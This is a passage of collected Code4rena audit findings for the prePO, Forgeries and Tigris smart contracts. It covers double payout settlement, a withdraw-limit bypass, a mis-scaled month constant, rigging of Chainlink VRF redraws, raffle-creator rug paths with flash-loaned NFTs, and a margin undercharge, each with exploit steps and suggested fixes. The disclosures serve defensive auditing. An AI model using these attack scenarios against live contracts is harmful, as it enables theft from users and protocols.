contract all the way to zero, avoiding the intended restrictions.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Include a check on the reserves in the `withdraw()` function as well as `managerWithdraw()`."}, {"title": "`PrePOMarket.setFinalLongPayout()` shouldn't be called twice.", "html_url": "https://github.com/code-423n4/2022-12-prepo-findings/issues/231", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2022-12-prepo-findings", "body": "# Lines of code  https://github.com/prepo-io/prepo-monorepo/blob/3541bc704ab185a969f300e96e2f744a572a3640/apps/smart-contracts/core/contracts/PrePOMarket.sol#L119   # Vulnerability details  ## Impact If `finalLongPayout` is changed twice by admin fault, the market would be insolvent as it should pay more collateral than it has.  ## Proof of Concept If `finalLongPayout` is less than `MAX_PAYOUT`, it means the market is ended and `longToken Price = finalLongPayout, shortToken Price = MAX_PAYOUT - finalLongPayout`.  So when users redeem their long/short tokens, the total amount of collateral tokens will be the same as the amount that users transferred during mint().  Btw in `setFinalLongPayout()`, there is no validation that this function can't be called twice and the below scenario would be possible.  1. Let's assume there is one user `Bob` in the market for simplicity. 2. `Bob` transferred 100 amounts of `collateral` and got 100 long/short tokens. The market has 100 `collateral`. 3. The market admin set `finalLongPayout = 60 * 1e16` and `Bob` redeemed 100 `longToken` and received 60 `collateral`. The market has 40 `collateral` now. 4. After that, the admin realized `finalLongPayout` is too high and changed `finalLongPayout = 40 * 1e16` again. 5. `Bob` tries to redeem 100 `shortToken` and receive 60 `collateral` but the market can't offer as it has 40 `collateral` only.  When there are several users in the market, some users can't redeem their long/short tokens as the market doesn't have enough `collaterals`.  ## Tools Used Manual Review  ## Recommended Mitigation Steps We should modify `setFinalLongPayout()` like below so it can't be finalized twice.  ```solidity   function setFinalLongPayout(uint256 _finalLongPayout) external override onlyOwner {      require(finalLongPayout > MAX_PAYOUT, \"Finalized already\"); //++++++++++++++++++++++++      require(_finalLongPayout >= floorLongPayout, \"Payout cannot be below floor\");     require(_finalLongPayout <= ceilingLongPayout, \"Payout cannot exceed ceiling\");     finalLongPayout = _finalLongPayout;     emit FinalLongPayoutSet(_finalLongPayout);   } ```"}, {"title": "Bypass userWithdrawLimitPerPeriod check", "html_url": "https://github.com/code-423n4/2022-12-prepo-findings/issues/49", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2022-12-prepo-findings", "body": "# Lines of code  https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/WithdrawHook.sol#L70   # Vulnerability details  ## Impact User can bypass the `userWithdrawLimitPerPeriod` check by transferring balance to another account  ## Proof of Concept 1. Assume `userWithdrawLimitPerPeriod` is set to `1000` 2. User A has current deposit of amount `2000` and wants to withdraw everything instantly 3. User A calls the withdraw function and takes out the `1000` amount  ``` function withdraw(uint256 _amount) external override nonReentrant {     uint256 _baseTokenAmount = (_amount * baseTokenDenominator) / 1e18;     uint256 _fee = (_baseTokenAmount * withdrawFee) / FEE_DENOMINATOR;     if (withdrawFee > 0) { require(_fee > 0, \"fee = 0\"); }     else { require(_baseTokenAmount > 0, \"amount = 0\"); }     _burn(msg.sender, _amount);     uint256 _baseTokenAmountAfterFee = _baseTokenAmount - _fee;     if (address(withdrawHook) != address(0)) {       baseToken.approve(address(withdrawHook), _fee);       withdrawHook.hook(msg.sender, _baseTokenAmount, _baseTokenAmountAfterFee);       baseToken.approve(address(withdrawHook), 0);     }     baseToken.transfer(msg.sender, _baseTokenAmountAfterFee);     emit Withdraw(msg.sender, _baseTokenAmountAfterFee, _fee);   } ```  4. Remaining `1000` amount cannot be withdrawn since `userWithdrawLimitPerPeriod` is reached  ``` function hook(     address _sender,     uint256 _amountBeforeFee,     uint256 _amountAfterFee   ) external override onlyCollateral { ... require(userToAmountWithdrawnThisPeriod[_sender] + _amountBeforeFee <= userWithdrawLimitPerPeriod, \"user withdraw limit exceeded\"); ... } ```  5. User simply transfer his balance to his another account and withdraw from that account  6. Since withdraw limit is tied to account so this new account will be allowed to make withdrawal thus bypassing userWithdrawLimitPerPeriod   ## Recommended Mitigation Steps User should only be allowed to transfer leftover limit. For example if User already utilized limit X then he should only be able to transfer userWithdrawLimitPerPeriod-X"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-12-forgeries-findings/issues/354", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-24"], "target": "2022-12-forgeries-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-forgeries-findings/blob/main/data/indijanc-G.md)."}, {"title": "Protocol safeguards for time durations are skewed by a factor of 7. Protocol may potentially lock NFT for period of 7 years.", "html_url": "https://github.com/code-423n4/2022-12-forgeries-findings/issues/273", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2022-12-forgeries-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L33   # Vulnerability details  ## Description  In VRFNFtRandomDraw.sol initialize(), the MONTH_IN_SECONDS variable is used to validate two values: - configured time between redraws is under 1 month - recoverTimelock (when NFT can be returned to owner) is less than 1 year in the future  ``` if (_settings.drawBufferTime > MONTH_IN_SECONDS) {     revert REDRAW_TIMELOCK_NEEDS_TO_BE_LESS_THAN_A_MONTH(); } ... if (     _settings.recoverTimelock >     block.timestamp + (MONTH_IN_SECONDS * 12) ) {     revert RECOVER_TIMELOCK_NEEDS_TO_BE_LESS_THAN_A_YEAR(); } ```  The issue is that MONTH_IN_SECONDS is calculated incorrectly: ``` /// @dev 60 seconds in a min, 60 mins in an hour uint256 immutable HOUR_IN_SECONDS = 60 * 60; /// @dev 24 hours in a day 7 days in a week uint256 immutable WEEK_IN_SECONDS = (3600 * 24 * 7); // @dev about 30 days in a month uint256 immutable MONTH_IN_SECONDS = (3600 * 24 * 7) * 30; ```  MONTH_IN_SECONDS multiplies by 7 incorrectly, as it was copied from WEEK_IN_SECONDS. Therefore, actual seconds calculated is equivalent of 7 months. Therefore, recoverTimelock can be up to a non-sensible value of 7 years, and re-draws every up to 7 months.   ## Impact  Protocol safeguards for time durations are skewed by a factor of 7. Protocol may potentially lock NFT for period of 7 years.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Fix MONTH_IN_SECONDS calculation: `uint256 immutable MONTH_IN_SECONDS = (3600 * 24) * 30;`"}, {"title": "Draw organizer can rig the draw to favor certain participants such as their own account.", "html_url": "https://github.com/code-423n4/2022-12-forgeries-findings/issues/272", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-02"], "target": "2022-12-forgeries-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L83   # Vulnerability details  ## Description  In RandomDraw, the host initiates a draw using startDraw() or redraw() if the redraw draw expiry has passed. Actual use of Chainlink oracle is done in \\_requestRoll: ``` request.currentChainlinkRequestId = coordinator.requestRandomWords({     keyHash: settings.keyHash,     subId: settings.subscriptionId,     minimumRequestConfirmations: minimumRequestConfirmations,     callbackGasLimit: callbackGasLimit,     numWords: wordsRequested }); ```  Use of subscription API is explained well [here](https://docs.chain.link/vrf/v2/subscription). Chainlink VRFCoordinatorV2 is called with requestRandomWords() and emits a random request. After `minimumRequestConfirmations` blocks, an oracle VRF node replies to the coordinator with a provable random, which supplies the random to the requesting contract via `fulfillRandomWords()`  call. It is important to note the role of subscription ID. This ID maps to the subscription charged for the request, in LINK tokens. In our contract, the raffle host supplies their subscription ID as a parameter. Sufficient balance check of the request ID is not [checked](https://github.com/smartcontractkit/chainlink/blob/286a65065fcfa5e1b2362745079cdc218e40e68d/contracts/src/v0.8/VRFCoordinatorV2.sol#L370) at request-time, but rather checked in Chainlink [node](https://github.com/smartcontractkit/chainlink/blob/806ee17236ba70926a1f07d1141808b634db48b6/core/services/vrf/listener_v2.go#L346) code as well as on-chain by [VRFCoordinator](https://github.com/smartcontractkit/chainlink/blob/286a65065fcfa5e1b2362745079cdc218e40e68d/contracts/src/v0.8/VRFCoordinatorV2.sol#L594) when the request is satisfied. In the scenario where the subscriptionID lacks funds, there will be a period of 24 hours when user can top up the account and random response will be [sent](https://docs.chain.link/vrf/v2/subscription):  \"Each subscription must maintain a minimum balance to fund requests from consuming contracts. If your balance is below that minimum, your requests remain pending for up to 24 hours before they expire. After you add sufficient LINK to a subscription, pending requests automatically process as long as they have not expired.\"  The reason this is extremely interesting is because as soon as redraws are possible, the random response can no longer be treated as fair. Indeed, Draw host can wait until redraw cooldown passed (e.g. 1 hour), and only then fund the subscriptionID. At this point, Chainlink node will send a TX with the random response. If host likes the response (i.e. the draw winner), they will not interfere. If they don't like the response, they can simply frontrun the Chainlink TX with a redraw() call. A redraw will create a new random request and discard the old requestId so the previous request will never be accepted. ``` function fulfillRandomWords(     uint256 _requestId,     uint256[] memory _randomWords ) internal override {     // Validate request ID    // <---------------- swap currentChainlinkRequestId --->     if (_requestId != request.currentChainlinkRequestId) {         revert REQUEST_DOES_NOT_MATCH_CURRENT_ID();     }  ... } ```  ``` //<------ redraw swaps currentChainlinkRequestId ---> request.currentChainlinkRequestId = coordinator.requestRandomWords({     keyHash: settings.keyHash,     subId: settings.subscriptionId,     minimumRequestConfirmations: minimumRequestConfirmations,     callbackGasLimit: callbackGasLimit,     numWords: wordsRequested }); ```  Chainlink docs [warn](https://docs.chain.link/vrf/v2/security) against this usage pattern of the VRF -\"Don\u2019t accept bids/bets/inputs after you have made a randomness request\". In this instance, a low subscription balance allows the host to invalidate the assumption that 1 hour redraw cooldown is enough to guarantee Chainlink answer has been received.  ## Impact  Draw organizer can rig the draw to favor certain participants such as their own account.  ## Proof of Concept  Owner offers a BAYC NFT for holders of their NFT collection X. Out of 10,000 tokenIDs, owner has 5,000 Xs. Rest belong to retail users.  1. owner subscriptionID is left with 0 LINK balance in coordinator 2. redraw time is set to 2 hours 3. owner calls startDraw() which will initiate a Chainlink request 4. owner waits for 2 hours and then tops up their subscriptionID with sufficient LINK 5. owner scans the mempool for fulfillRandomWords() 6. If the raffle winner is tokenID < 5000, it is owner's token  1. Let fulfill execute and pick up the reward 7. If tokenID >= 5000  1. Call redraw()  2. fulfill will revert because of requestId mismatch 8. Owner has 75% of claiming the NFT instead of 50%  Note that Forgeries draws are presumably intended as incentives for speculators to buy NFTs from specific collections. Without having a fair shot at receiving rewards from raffles, these NFTs user buys could be worthless. Another way to look at it is that the impact is theft of yield, as host can freely decrease the probability that a token will be chosen for rewards with this method.  Also, I did not categorize it as centralization risk as the counterparty is not Forgeries but rather some unknown third-party host which offers an NFT incentive program. It is a similar situation to the distinction made between 1st party and 3rd party projects [here](https://github.com/code-423n4/2022-10-juicebox-findings/issues/191)  ## Tools Used  Manual audit [Chainlink docs](https://docs.chain.link/vrf/v2/subscription) [Chainlink co-ordinator code](https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/VRFCoordinatorV2.sol)  ## Recommended Mitigation Steps  The root cause is that Chainlink response can arrive up to 24 hours from the most request is dispatched, while redraw cooldown can be 1 hour+. The best fix would be to enforce minimum cooldown of 24 hours."}, {"title": "Admin does not have to wait to call `lastResortTimelockOwnerClaimNFT()`", "html_url": "https://github.com/code-423n4/2022-12-forgeries-findings/issues/146", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-01"], "target": "2022-12-forgeries-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L304-L320   # Vulnerability details  On contest page: `\"If no users ultimately claim the NFT, the admin specifies a timelock period after which they can retrieve the raffled NFT.\"`  Let's assume a recoverTimelock of 1 week.  The specification suggests that 1 week from the winner not having claimed the NFT. Meaning that the admin should only be able to call `lastResortTimelockOwnerClaimNFT()` only after `<block.timestamp at fulfillRandomWords()> + request.drawTimelock + 1 weeks`.   Specification: ```          drawTimelock                recoverTimelock              \u2502                              \u2502              \u25bc                              \u25bc         \u250c\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502    \u2502           1 week             \u2502         \u2514\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u25b2         \u2502 fulfillRandomWords() ``` - The winner should have up to `drawTimelock` to claim before an admin can call `redraw()` and pick a new winner. - The winner should have up to `recoverTimelock` to claim before an admin can call `lastResortTimelockOwnerClaimNFT()` to cancel the raffle.  But this is not the case.   **recoverTimelock** is set in the `initialize(...)` function and not anywhere else. That means 1 week from initialization, the admin can call `lastResortTimelockOwnerClaimNFT()`. `redraw()` also does not update `recoverTimelock`.  In fact, `startDraw()` does not have to be called at the same time as `initialize(...)`. That means that if the draw was started after having been initialized for 1 week, the admin can withdraw at any time after that.  ### Impact Protocol does not work as intended.  ### Recommendations Just like for `drawTimelock`, `recoverTimelock` should also be updated for each dice roll. `<block.timestamp at fulfillRandomWords()> + request.drawTimelock + <recoverBufferTime>`.  where `<recoverBufferTime>` is essentially the `drawBufferTime` currently used, but for `recoverTimelock`.  **Note:** currently, `drawTimelock` is updated in the `_requestRoll()` function. This is \"technically less correct\" as chainlink will take some time before `fulfillRandomWords(...)` callback. So the timelock is actually set before the winner has been chosen.  This should be insignificant under normal network conditions (Chainlink VRF shouldn't take > 1min) but both timelocks should be updated in the same function - either `_requestRoll()` or `fulfillRandomWords(...)`."}, {"title": "VRFNFTRandomDraw admin can prevent created or started raffle from taking place", "html_url": "https://github.com/code-423n4/2022-12-forgeries-findings/issues/101", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2022-12-forgeries-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L173 https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L162-L168   # Vulnerability details  ## Impact The admin/owner of `VRFNFTRandomDraw` can `startDraw()` a raffle, including emitting the `SetupDraw` event, but in a way that ensures `fulfillRandomWords()` is never called. For example: - `keyHash` is not validated within `coordinator.requestRandomWords()`. Providing an invalid `keyHash` will allow the raffle to start but prevent the oracle from actually supplying a random value to determine the raffle result.     - https://github.com/smartcontractkit/chainlink/blob/00f9c6e41f843f96108cdaa118a6ca740b11df35/contracts/src/v0.8/VRFCoordinatorV2.sol#L407-L409     - https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L163 - The admin/owner could alternatively ensure that the owner-provided chain.link VRF subscription does not have sufficient funds to pay at the time the oracle attempts to supply random values in `fulfillRandomWords()`.     - https://github.com/smartcontractkit/chainlink/blob/00f9c6e41f843f96108cdaa118a6ca740b11df35/contracts/src/v0.8/VRFCoordinatorV2.sol#L594-L596  In addition, the owner/admin could simply avoid ever calling `startDraw()` in the first place.  ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.  ## Tools Used  ## Recommended Mitigation Steps Depending on the desired functionality with respect to the raffle owner, a successful callback to `fulfillRandomWords()` could be a precondition of the admin/owner reclaiming the reward NFT. This would help ensure the owner does not create raffles that they intend will never pay out a reward."}, {"title": "Raffle creator can rug participants", "html_url": "https://github.com/code-423n4/2022-12-forgeries-findings/issues/88", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2022-12-forgeries-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L173 https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L304 https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L127   # Vulnerability details  ## Impact The raffle creator is not required to actually give the NFT away. The NFT that is used for the raffle is transferred to the contract when `startDraw` is executed. Before that, the NFT is in the hands of the creator. This means that he might create a raffle to make users buy NFTs required to participate and then refuse to draw a winner and keep the NFT to himself. Furthermore, he might not even be the owner of NFT in the first place, which he can achieve by flash loaning the NFT in order to pass the `ownerOf` check in `initialize` function.  ## Proof of Concept ### Example 1 1. User U creates an NFT collection C 2. He buys a BAYC NFT 3. He creates a raffle with it, and requires `drawingToken` to be from collection C 4. Users buy tokens from his collection C 5. He then refuses to execute `startDraw` function and rather sells the BAYC NFT  ### Example 2 1. User U creates an NFT collection C 2. User U uses an NFT flash loan to borrow a very expensive NFT 3. In the same transaction he creates a raffle with this NFT, and requires `drawingToken` to be from collection C 4. The check that he is the owner will pass, because for the duration of the transaction he in fact is 5. Users see that there is a raffle for a very expensive NFT, so they buy tokens C 6. The winner is never drawn, because the creator does not even own the NFT  ### Example 3 1. User U has an NFT X 2. He puts X on a sale on some NFT marketplace (which does not require him to lock it in contract) 3. He forgets about it and creates a raffle with it 4. Users buy the tokens necessary for the raffle 5. User U wants to execute the `startDraw` function, but just before it the NFT X is bought from him through the marketplace 6. The winner cannot be drawn  ## Recommended Mitigation Steps Transfer the NFT to the contract at the time of creation of the raffle.  You can do that by approving the factory contract to transfer the token and do the transfer in [`makeNewDraw`](https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDrawFactory.sol#L43) function between cloning and `initialization`. ``` address newDrawing = ClonesUpgradeable.clone(implementation); IERC721(settings.token).transferFrom(msg.sender, newDrawing, settings.tokenId);         // Setup the new drawing IVRFNFTRandomDraw(newDrawing).initialize(admin, settings); ```  Remember to remove token transfer from `startDraw` function.  Notice that the creator can still claim NFT after a week, without drawing, by executing `lastResortTimelockOwnerClaimNFT`. To prevent that, I would recommend adding a check in [`lastResortTimelockOwnerClaimNFT`](https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L304), if a winner was drawn. ```  if (!request.hasChosenRandomNumber) {             revert NEEDS_TO_HAVE_CHOSEN_A_NUMBER(); } ``` So now a user can trust that the NFT is locked in the contract, and it will be claimable only by a winner (or creator if the winner does not claim it). However, there is still no guarantee that the winner will actually be drawn, because the creator has to manually execute `startDraw` function. To fix this, I would recommend allowing anyone to execute `startDraw` function, so there is no need to rely on the creator. But we would need to limit the time window of when [`startDraw`](https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L173) can be executed, so users have the time to get tokens before the drawing. That can be done by introducing a new state variable `firstDrawTime`, that acts as a timestamp after which drawing can happen. ``` if(block.timestamp < firstDrawTime) revert CANNOT_DRAW_YET(); ``` Notice that now NFT can only be claimed after winner has been drawn. This means that we are depending on ChainLink VRF to be successful. For that reason I would recommend adding a role that has the power to change the VRF subscription or restore the NFT in case where winner is not picked in reasonable time. This role would be given to protocol owner (owner of the factory) / DAO / someone who would be considered as most reliable. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/663", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-07"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Deekshith99-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/662", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-12"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Deivitto-Q.md)."}, {"title": "Not enough margin pulled or burned from user when adding to a position", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/659", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "upgraded by judge", "H-11"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L275-L282   # Vulnerability details  ## Impact When adding to a position, the amount of margin pulled from the user is not as much as it should be, which leaks value from the protocol and lowering the collateralization ratio of `tigAsset`.  ## Proof of Concept In `Trading.addToPosition` the `_handleDeposit` function is called like this:  ```js _handleDeposit(     _trade.tigAsset,     _marginAsset,     _addMargin - _fee,     _stableVault,     _permitData,     _trader ); ```  The third parameter with the value of `_addMargin - _fee` is the amount pulled (or burned in the case of using `tigAsset`) from the user. The `_fee` value is calculated as part of the position size like this:   ```js uint _fee = _handleOpenFees(_trade.asset, _addMargin*_trade.leverage/1e18, _trader, _trade.tigAsset, false); ```  The `_handleOpenFees` function mints `_tigAsset` to the referrer, to the `msg.sender` (if called by a function meant to be executed by bots) and to the protocol itself. Those minted tokens are supposed to be part of the `_addMargin` value paid by the user. Hence using `_addMargin - _fee` as the third parameter to `_handleDeposit` is going to pull or burn less margin than what was accounted for.  An example for correct usage can be seen in `initiateMarketOrder`:  ```js uint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false); uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18; _handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader); ```  Here the third parameter to `_handleDeposit` is not `_marginAfterFees` but `_tradeInfo.margin` which is what the user has input and is supposed to pay.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  In `Trading.addToPosition` call the `_handleDeposit` function without subtracting the `_fee` value:  ```js _handleDeposit(     _trade.tigAsset,     _marginAsset,     _addMargin,     _stableVault,     _permitData,     _trader ); ```"}]